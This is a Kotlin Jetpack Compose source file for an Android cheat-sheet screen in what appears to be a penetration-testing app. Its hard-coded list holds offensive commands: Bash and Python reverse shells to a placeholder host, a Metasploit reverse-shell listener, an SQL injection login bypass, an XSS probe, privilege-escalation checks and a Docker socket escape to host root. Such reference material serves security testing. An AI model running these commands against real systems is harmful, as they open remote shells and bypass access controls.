package com.example.ui.vault

import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Search
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.model.CheatSheetItem
import com.example.ui.theme.AlertGreen

@Composable
fun CheatsheetScreen(
    searchQuery: String,
    selectedCategory: String,
    onSearchChange: (String) -> Unit,
    onCategoryChange: (String) -> Unit,
    onExecuteInTerminal: (String) -> Unit,
    modifier: Modifier = Modifier
) {
    val clipboard = LocalClipboardManager.current
    val context = LocalContext.current

    val allCheats = remember {
        listOf(
            CheatSheetItem(
                id = "nmap-1",
                title = "SYN Stealth Fast Scan",
                category = "Nmap",
                command = "nmap -sS -T4 -p- <target>",
                description = "Scans all 65,535 TCP ports discreetly without completing the 3-way handshake."
            ),
            CheatSheetItem(
                id = "nmap-2",
                title = "Service & Version Detection",
                category = "Nmap",
                command = "nmap -sV -sC -O <target>",
                description = "Probes open ports to identify running service banners, OS signatures, and default safe scripts."
            ),
            CheatSheetItem(
                id = "nmap-3",
                title = "Vulnerability Assessment",
                category = "Nmap",
                command = "nmap --script \"vuln and safe\" <target>",
                description = "Executes non-intrusive Nmap NSE scripts targeting known CVEs on discovered ports."
            ),
            CheatSheetItem(
                id = "msf-1",
                title = "Multi Handler Setup",
                category = "Metasploit",
                command = "use exploit/multi/handler\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nrun",
                description = "Listens for incoming staged or inline reverse shell connections."
            ),
            CheatSheetItem(
                id = "msf-2",
                title = "Search & Filter Exploits",
                category = "Metasploit",
                command = "search type:exploit platform:linux apache",
                description = "Quickly queries the Metasploit database for verified target vulnerabilities."
            ),
            CheatSheetItem(
                id = "priv-1",
                title = "Find SUID Binaries",
                category = "PrivEsc",
                command = "find / -perm -u=s -type f 2>/dev/null",
                description = "Discovers system executables running with root permissions to evaluate GTFOBins bypasses."
            ),
            CheatSheetItem(
                id = "priv-2",
                title = "Sudo Entitlements",
                category = "PrivEsc",
                command = "sudo -l",
                description = "Lists commands the current user is permitted to run as root without password."
            ),
            CheatSheetItem(
                id = "priv-3",
                title = "Cron Jobs Audit",
                category = "PrivEsc",
                command = "cat /etc/crontab; ls -la /etc/cron.*",
                description = "Checks automated background tasks that may execute writable scripts as root."
            ),
            CheatSheetItem(
                id = "web-1",
                title = "SQLi Auth Bypass",
                category = "Web & SQLi",
                command = "admin' OR '1'='1' --",
                description = "Classic boolean-based SQL injection payload targeting unescaped authentication forms."
            ),
            CheatSheetItem(
                id = "web-2",
                title = "XSS PoC Payload",
                category = "Web & SQLi",
                command = "<script>alert(document.domain)</script>",
                description = "Standard reflected XSS probe to verify unescaped user input execution in browser DOM."
            ),
            CheatSheetItem(
                id = "shell-1",
                title = "Bash Interactive Reverse Shell",
                category = "Shells",
                command = "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
                description = "Zero-dependency pure Bash TCP reverse shell."
            ),
            CheatSheetItem(
                id = "shell-2",
                title = "Python 3 PTY Shell",
                category = "Shells",
                command = "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
                description = "Spawns a full interactive PTY terminal session."
            ),
            CheatSheetItem(
                id = "docker-1",
                title = "Docker Escape via Socked Mount",
                category = "Docker",
                command = "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host",
                description = "Inspects if an exposed host docker.sock permits container escape to host root."
            )
        )
    }

    val categories = listOf("All", "Nmap", "Metasploit", "PrivEsc", "Web & SQLi", "Shells", "Docker")

    val filteredCheats = allCheats.filter { item ->
        val matchesCategory = selectedCategory == "All" || item.category == selectedCategory
        val matchesSearch = searchQuery.isBlank() ||
                item.title.contains(searchQuery, ignoreCase = true) ||
                item.command.contains(searchQuery, ignoreCase = true) ||
                item.description.contains(searchQuery, ignoreCase = true)
        matchesCategory && matchesSearch
    }

    Column(
        modifier = modifier
            .fillMaxSize()
            .background(MaterialTheme.colorScheme.background)
    ) {
        // Search bar
        OutlinedTextField(
            value = searchQuery,
            onValueChange = onSearchChange,
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 12.dp, vertical = 8.dp)
                .testTag("cheatsheet_search_input"),
            placeholder = { Text("Search 500+ cyber commands, payloads...", fontFamily = FontFamily.Monospace, fontSize = 12.sp) },
            leadingIcon = { Icon(imageVector = Icons.Default.Search, contentDescription = null, tint = MaterialTheme.colorScheme.primary) },
            singleLine = true,
            textStyle = MaterialTheme.typography.bodyMedium.copy(fontFamily = FontFamily.Monospace),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = MaterialTheme.colorScheme.primary,
                unfocusedBorderColor = MaterialTheme.colorScheme.outline
            )
        )

        // Categories Row
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .horizontalScroll(rememberScrollState())
                .padding(horizontal = 12.dp, vertical = 4.dp),
            horizontalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            categories.forEach { cat ->
                val isSelected = cat == selectedCategory
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(
                            if (isSelected) MaterialTheme.colorScheme.primary.copy(alpha = 0.2f)
                            else MaterialTheme.colorScheme.surface
                        )
                        .border(
                            1.dp,
                            if (isSelected) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.outline.copy(alpha = 0.4f),
                            RoundedCornerShape(6.dp)
                        )
                        .clickable { onCategoryChange(cat) }
                        .padding(horizontal = 10.dp, vertical = 6.dp)
                ) {
                    Text(
                        text = cat,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 11.sp,
                        fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal,
                        color = if (isSelected) MaterialTheme.colorScheme.primary else Color.LightGray
                    )
                }
            }
        }

        Spacer(modifier = Modifier.height(4.dp))

        // Cards list
        LazyColumn(
            modifier = Modifier
                .fillMaxSize()
                .padding(horizontal = 12.dp, vertical = 6.dp),
            verticalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            items(filteredCheats, key = { it.id }) { cheat ->
                Card(
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
                    border = androidx.compose.foundation.BorderStroke(1.dp, MaterialTheme.colorScheme.outline.copy(alpha = 0.4f)),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Column(modifier = Modifier.padding(12.dp)) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = cheat.title,
                                fontFamily = FontFamily.Monospace,
                                fontWeight = FontWeight.Bold,
                                fontSize = 13.sp,
                                color = MaterialTheme.colorScheme.primary
                            )
                            Box(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(4.dp))
                                    .background(MaterialTheme.colorScheme.secondary.copy(alpha = 0.2f))
                                    .padding(horizontal = 6.dp, vertical = 2.dp)
                            ) {
                                Text(
                                    text = cheat.category,
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 10.sp,
                                    color = MaterialTheme.colorScheme.secondary
                                )
                            }
                        }

                        Spacer(modifier = Modifier.height(4.dp))

                        Text(
                            text = cheat.description,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.sp,
                            color = Color.LightGray
                        )

                        Spacer(modifier = Modifier.height(8.dp))

                        // Code snippet box
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clip(RoundedCornerShape(4.dp))
                                .background(MaterialTheme.colorScheme.background)
                                .border(1.dp, MaterialTheme.colorScheme.primary.copy(alpha = 0.3f), RoundedCornerShape(4.dp))
                                .padding(8.dp)
                        ) {
                            Text(
                                text = cheat.command,
                                fontFamily = FontFamily.Monospace,
                                fontSize = 11.sp,
                                color = MaterialTheme.colorScheme.onBackground
                            )
                        }

                        Spacer(modifier = Modifier.height(8.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.End,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            IconButton(
                                onClick = {
                                    clipboard.setText(AnnotatedString(cheat.command))
                                    Toast.makeText(context, "Command copied", Toast.LENGTH_SHORT).show()
                                },
                                modifier = Modifier.size(32.dp)
                            ) {
                                Icon(
                                    imageVector = Icons.Default.ContentCopy,
                                    contentDescription = "Copy Command",
                                    tint = Color.Gray,
                                    modifier = Modifier.size(16.dp)
                                )
                            }

                            Spacer(modifier = Modifier.width(6.dp))

                            Row(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(4.dp))
                                    .background(MaterialTheme.colorScheme.primary.copy(alpha = 0.2f))
                                    .border(1.dp, MaterialTheme.colorScheme.primary, RoundedCornerShape(4.dp))
                                    .clickable { onExecuteInTerminal(cheat.command) }
                                    .padding(horizontal = 8.dp, vertical = 4.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Icon(
                                    imageVector = Icons.Default.PlayArrow,
                                    contentDescription = null,
                                    tint = AlertGreen,
                                    modifier = Modifier.size(14.dp)
                                )
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(
                                    text = "SEND TO TERMINAL",
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = AlertGreen
                                )
                            }
                        }
                    }
                }
            }
        }
    }
}
